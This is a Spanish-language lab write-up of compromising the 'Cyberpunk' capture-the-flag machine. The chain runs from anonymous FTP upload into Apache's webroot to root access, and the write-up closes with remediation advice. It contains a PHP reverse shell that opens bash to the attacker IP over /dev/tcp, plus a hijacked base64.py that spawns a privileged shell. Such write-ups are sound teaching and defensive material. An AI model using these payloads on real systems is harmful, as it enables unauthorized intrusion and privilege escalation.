---
title: "Cyberpunk"
description: "Write-up de laboratorio: FTP anónimo, webroot expuesto, reverse shell PHP y escalada por Python Library Hijacking."
---

# Cyberpunk - Write-up de Pentesting

> **Uso académico:** este documento describe una prueba de penetración realizada en un entorno controlado de laboratorio. No debe aplicarse sobre sistemas reales, redes de terceros o activos no autorizados.  
> **Versión pública:** los valores exactos de las banderas fueron omitidos para publicación en GitHub/SecNotes.

## 1. Resumen

La máquina **Cyberpunk** fue comprometida mediante una cadena de ataque basada en una mala configuración del servicio FTP y del servidor web Apache. El servicio FTP permitía acceso anónimo, lectura y escritura de archivos. Además, el contenido subido por FTP quedaba publicado directamente por Apache y el servidor interpretaba archivos PHP.

La combinación de FTP anónimo, permisos de escritura, webroot compartido y ejecución de PHP permitió subir una reverse shell y obtener acceso inicial como `www-data`. Posteriormente, se identificó información codificada en `/opt/arasaka.txt`, que permitió acceder al usuario `arasaka`. La escalada final a root se logró mediante **Python Library Hijacking**, aprovechando un script Python ejecutable con sudo.

## 2. Ficha técnica

| Elemento | Valor |
|---|---|
| Máquina evaluada | Cyberpunk |
| Tipo de máquina | Laboratorio vulnerable |
| Sistema operativo objetivo | Linux / Debian |
| Máquina atacante | Kali Linux |
| Plataforma | VirtualBox |
| Tipo de red | Adaptador puente |
| Red de laboratorio | `192.168.1.0/24` |
| IP atacante | `192.168.1.28` |
| IP objetivo | `192.168.1.40` |
| Modalidad | Caja negra |
| Objetivo | Obtener `user.txt` y `root.txt` |

## 3. Reconocimiento

Primero se validó la configuración de red de la máquina atacante.

```bash
ip a
```

Salida relevante:

```text
Interfaz: eth0
IP atacante: 192.168.1.28
MAC: 08:00:27:5a:87:bc
```
<img src="../assets/img/cyberpunk/01_ip_propia.png" alt="Figura 1. IP máquina atacante" width="850">

**Figura 1.** Validación de la dirección IP de la máquina atacante Kali Linux.

Luego se realizó descubrimiento de hosts activos dentro de la red local.

```bash
sudo netdiscover
nmap -sn 192.168.1.0/24
sudo arp-scan -l
```

Resultado relevante:

```text
Host activo: 192.168.1.40
MAC Address: 08:00:27:2D:73:47
Vendor: Oracle VirtualBox virtual NIC
```

El host `192.168.1.40` fue identificado como la máquina objetivo **Cyberpunk**.

<img src="../assets/img/cyberpunk/02_ip_objetivo.png" alt="Figura 2. IP máquina objetivo" width="850">

**Figura 2.** Identificación de la dirección IP de la máquina objetivo Cyberpunk.

## 4. Escaneo

Se ejecutó un escaneo completo de puertos TCP.

```bash
nmap -p- -O 192.168.1.40
```
<img src="../assets/img/cyberpunk/03_nmap_completo.png" alt="Figura 3. Escaneo completo de puertos" width="850">

**Figura 3.** Escaneo completo de puertos TCP mediante Nmap.

Puertos identificados:

| Puerto | Estado | Servicio |
|---|---|---|
| `21/tcp` | Abierto | FTP |
| `22/tcp` | Abierto | SSH |
| `80/tcp` | Abierto | HTTP |

Interpretación inicial:

- `21/tcp`: servicio FTP. Debe validarse si permite acceso anónimo, lectura o escritura.
- `22/tcp`: SSH. Puede ser útil si se obtienen credenciales.
- `80/tcp`: Apache HTTP. Prioritario para enumeración web.

## 5. Enumeración

### 5.1 Detección de versiones

Se realizó enumeración específica sobre los puertos abiertos.

```bash
nmap -p21,22,80 -sVC -Pn 192.168.1.40 -T4
```

<img src="../assets/img/cyberpunk/04_versiones_puertos.png" alt="Figura 4. Detección de versiones" width="850">

**Figura 4.** Enumeración de servicios y versiones en los puertos 21, 22 y 80.

| Puerto | Servicio | Versión / información obtenida |
|---|---|---|
| `21/tcp` | FTP | ProFTPD con acceso anónimo habilitado |
| `22/tcp` | SSH | OpenSSH 9.2p1 Debian 2+deb12u2 |
| `80/tcp` | HTTP | Apache httpd 2.4.59 Debian, título `Arasaka` |

Nmap identificó que el FTP permitía inicio de sesión anónimo y listó contenido accesible.

```text
Anonymous FTP login allowed
images/
index.html
secret.txt
```

### 5.2 Enumeración manual de FTP

Se validó manualmente el acceso anónimo.

```bash
ftp 192.168.1.40
```

Credencial usada:

```text
Usuario: anonymous
Contraseña: anonymous / vacío
```
<img src="../assets/img/cyberpunk/05_ftp_conexion.png" alt="Figura 5. Conexión FTP anónima" width="850">

**Figura 5.** Conexión exitosa al servicio FTP utilizando el usuario `anonymous`.

Respuesta relevante:

```text
230 Aceptado acceso anónimo, aplicadas restricciones
```

Contenido listado:

```bash
ls
```

```text
images/
index.html
secret.txt
```

La presencia de `secret.txt` fue relevante porque podía contener pistas o información sensible para avanzar en el laboratorio.

### 5.3 Descarga de archivos desde FTP

Se descargaron los archivos expuestos.

```bash
get secret.txt
get index.html
cd images
ls
get netrunner.jpeg
exit
```
<img src="../assets/img/cyberpunk/06_descargas_ftp.png" alt="Figura 6. Descarga de archivos FTP" width="850">

**Figura 6.** Descarga de archivos expuestos mediante FTP anónimo.

Archivos obtenidos:

| Archivo | Origen | Interpretación |
|---|---|---|
| `secret.txt` | Raíz FTP | Pista del laboratorio |
| `index.html` | Raíz FTP | Archivo relacionado con el sitio web |
| `netrunner.jpeg` | `images/` | Imagen usada por el sitio web |

### 5.4 Análisis local de archivos

Se revisaron los archivos descargados.

```bash
cat secret.txt
cat index.html
file netrunner.jpeg
```
<img src="../assets/img/cyberpunk/07_lectura_secret_txt.png" alt="Figura 7. Lectura de secret.txt" width="850">

**Figura 7.** Lectura del archivo `secret.txt`, el cual entrega una pista hacia el servicio Apache.

Pista encontrada en `secret.txt`:

```text
Te espero en Apache.
— Alt
```

El archivo `index.html` referenciaba la imagen descargada desde FTP:

```html
<img src="images/netrunner.jpeg" alt="Imagen de Cyberpunk 2077">
```

Esto permitió correlacionar el contenido del FTP con el sitio web servido por Apache.

## 6. Análisis de vulnerabilidades

### 6.1 Enumeración web

Se ejecutó Gobuster para buscar rutas y archivos en Apache.

```bash
gobuster dir \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x html,htm,php,txt,xml,js \
  -u http://192.168.1.40
```
<img src="../assets/img/cyberpunk/08_gobuster_puerto_80.png" alt="Figura 8. Gobuster puerto 80" width="850">

**Figura 8.** Enumeración de rutas web mediante Gobuster sobre el puerto 80.

Resultados:

| Ruta | Código HTTP | Interpretación |
|---|---:|---|
| `/index.html` | 200 | Página principal |
| `/images/` | 301 | Directorio de imágenes |
| `/secret.txt` | 200 | Archivo accesible desde web |
| `/server-status` | 403 | Recurso existente, acceso denegado |

La existencia de los mismos archivos por FTP y HTTP indicó que FTP probablemente expone el directorio raíz del sitio web o una copia directa de este.

<img src="../assets/img/cyberpunk/09_secret_web.png" alt="Figura 9. secret.txt accesible por HTTP" width="850">

**Figura 9.** Validación de que el archivo `secret.txt` también es accesible desde el servicio HTTP.

### 6.2 Validación de escritura FTP

Se creó un archivo de prueba no malicioso y se subió mediante FTP.

```bash
echo "podemos subir archivos a ftp" > prueba.txt
ftp 192.168.1.40
put prueba.txt
```

Luego se validó desde HTTP:

```text
http://192.168.1.40/prueba.txt
```

Contenido observado:

```text
podemos subir archivos a ftp
```
<img src="../assets/img/cyberpunk/10_carga_archivo_rueba.png" alt="Figura 10. Carga de archivo de prueba" width="850">

**Figura 10.** Carga exitosa de un archivo de prueba mediante FTP y validación desde Apache.

Este resultado confirmó que el usuario anónimo podía escribir en el directorio publicado por Apache.

### 6.3 Validación de ejecución PHP

Se creó un archivo PHP de prueba.

```bash
echo '<?php echo "PHP_OK"; ?>' > test.php
```

Se subió mediante FTP:

```bash
put test.php
```

Luego se accedió desde el navegador:

```text
http://192.168.1.40/test.php
```

Resultado:

```text
PHP_OK
```
<img src="../assets/img/cyberpunk/11_carga_php_prueba.png" alt="Figura 11. Prueba de ejecución PHP" width="850">

**Figura 11.** Validación de ejecución de código PHP desde el servidor web.

Esto confirmó que Apache ejecutaba archivos PHP subidos por FTP. La vulnerabilidad pasó de carga arbitraria de archivos a ejecución remota de código.

## 7. Explotación

Se creó una reverse shell PHP apuntando a la máquina atacante `192.168.1.28` en el puerto `4444`.

Contenido de `shell.php`:

```php
<?php
system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.28/4444 0>&1'");
?>
```

Se subió al servidor mediante FTP:

```bash
put shell.php
```

Se preparó el listener en Kali:

```bash
nc -lvnp 4444
```

Luego se ejecutó la shell desde el navegador:

```text
http://192.168.1.40/shell.php
```

Resultado:

```text
connect to [192.168.1.28] from (UNKNOWN) [192.168.1.40]
www-data@Cyberpunk:/var/www/html$
```
<img src="../assets/img/cyberpunk/12_php_reverse_shell.png" alt="Figura 12. Reverse shell PHP" width="850">

**Figura 12.** Obtención de reverse shell mediante archivo PHP cargado por FTP.

Se obtuvo acceso inicial como `www-data`, usuario asociado al servicio web Apache.

## 8. Post-explotación y acceso al usuario

Desde la shell como `www-data`, se enumeró el sistema.

```bash
ls /
cd /root
```

Resultado:

```text
Permission denied
```

Luego se revisaron directorios relevantes:

```bash
ls /home
ls /opt
cat /opt/arasaka.txt
```

Se identificó un usuario local:

```text
/home/arasaka
```

También se encontró el archivo:

```text
/opt/arasaka.txt
```
<img src="../assets/img/cyberpunk/13_arasaka_txt_encriptado.png" alt="Figura 13. Archivo arasaka.txt" width="850">

**Figura 13.** Lectura del archivo `arasaka.txt` con contenido codificado.

El contenido de `arasaka.txt` estaba compuesto por caracteres típicos de **Brainfuck**, como `+`, `>`, `<`, `-`, `.` y corchetes. Al decodificarlo, se obtuvo:

```text
cyberpunk2077
```
<img src="../assets/img/cyberpunk/14_desencripcion.png" alt="Figura 14. Desencripción de arasaka.txt" width="850">

**Figura 14.** Decodificación del contenido identificado en `arasaka.txt`.

Esta cadena fue usada como posible contraseña del usuario `arasaka`.

```bash
su arasaka
```

Luego se accedió al directorio del usuario:

```bash
cd /home/arasaka
ls
cat user.txt
```

Resultado:

```text
randombase64.py
user.txt
[FLAG USER REDACTED]
```
<img src="../assets/img/cyberpunk/15_bandera_user.png" alt="Figura 15. Bandera user.txt" width="850">

**Figura 15.** Obtención de la bandera `user.txt` como usuario `arasaka`.

## 9. Escalada de privilegios

### 9.1 Revisión de permisos sudo

Se ejecutó:

```bash
sudo -l
```

Resultado relevante:

```text
(root) PASSWD: /usr/bin/python3.11 /home/arasaka/randombase64.py
```

El usuario `arasaka` podía ejecutar como root un script Python ubicado dentro de su propio directorio personal.

<img src="../assets/img/cyberpunk/16_suid.png" alt="Figura 16. Revisión de permisos sudo" width="850">

**Figura 16.** Revisión de permisos privilegiados disponibles para el usuario `arasaka`.

### 9.2 Análisis del script

Contenido relevante de `randombase64.py`:

```python
import base64

message = input("Enter your string")
message_bytes = message.encode("ascii")
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode("ascii")
print(base64_message)
```

El script importa el módulo `base64`. Como el script se encuentra en un directorio controlado por el usuario, se identificó una vía de escalada mediante **Python Library Hijacking**.

### 9.3 Python Library Hijacking

Se creó un archivo local llamado `base64.py` en `/home/arasaka` para secuestrar la importación del módulo legítimo.

```bash
cat > /home/arasaka/base64.py << 'PYEOF'
import os
os.system("/bin/bash -p")
PYEOF
```

Luego se ejecutó el script autorizado por sudo:

```bash
sudo /usr/bin/python3.11 /home/arasaka/randombase64.py
```

Al ejecutarse con privilegios de root, Python cargó el archivo local `base64.py` y ejecutó `/bin/bash -p`.

Validación:

```bash
whoami
```

Resultado:

```text
root
```

Se accedió al directorio root y se leyó la bandera final.

```bash
cd /root
ls
cat root.txt
```

Resultado:

```text
root.txt
[FLAG ROOT REDACTED]
```
<img src="../assets/img/cyberpunk/17_root.png" alt="Figura 17. Bandera root.txt" width="850">

**Figura 17.** Escalada de privilegios y obtención de la bandera `root.txt`.

## 10. Banderas

| Bandera | Usuario / privilegio | Ruta | Valor |
|---|---|---|---|
| `user.txt` | `arasaka` | `/home/arasaka/user.txt` | `[REDACTED]` |
| `root.txt` | `root` | `/root/root.txt` | `[REDACTED]` |

## 11. Resumen de hallazgos

| ID | Hallazgo | Impacto | Severidad | Recomendación |
|---|---|---|---|---|
| H-01 | FTP anónimo habilitado | Acceso no autenticado a archivos del servidor | Alta | Deshabilitar acceso anónimo y exigir autenticación |
| H-02 | FTP permite escritura | Carga arbitraria de archivos | Alta | Restringir permisos de escritura y separar roles |
| H-03 | FTP vinculado al webroot de Apache | Archivos subidos quedan publicados por HTTP | Alta | Separar directorios FTP y webroot |
| H-04 | Apache ejecuta PHP subido por FTP | Ejecución remota de código | Crítica | Bloquear ejecución en directorios de subida |
| H-05 | Información sensible codificada en `/opt/arasaka.txt` | Exposición de contraseña o pista de acceso | Media | Eliminar secretos de archivos accesibles |
| H-06 | Script Python ejecutable con sudo desde directorio controlado por usuario | Escalada de privilegios a root | Crítica | No ejecutar como root scripts ubicados en rutas modificables por usuarios |

## 12. Conclusión

La resolución de Cyberpunk evidenció cómo varias malas configuraciones encadenadas pueden derivar en compromiso total del sistema. El acceso anónimo a FTP no solo permitió leer archivos, sino también escribir en un directorio publicado por Apache. Al confirmarse la ejecución de PHP, fue posible obtener una reverse shell como `www-data`.

La escalada de privilegios se produjo por una configuración sudo insegura que permitía ejecutar como root un script Python ubicado en el directorio personal del usuario. La importación del módulo `base64` fue aprovechada mediante Python Library Hijacking para ejecutar una shell privilegiada.

Las medidas defensivas prioritarias serían deshabilitar FTP anónimo, separar el almacenamiento FTP del webroot, impedir ejecución de código en directorios de subida, remover secretos del sistema y auditar reglas sudo que ejecuten scripts modificables por usuarios.
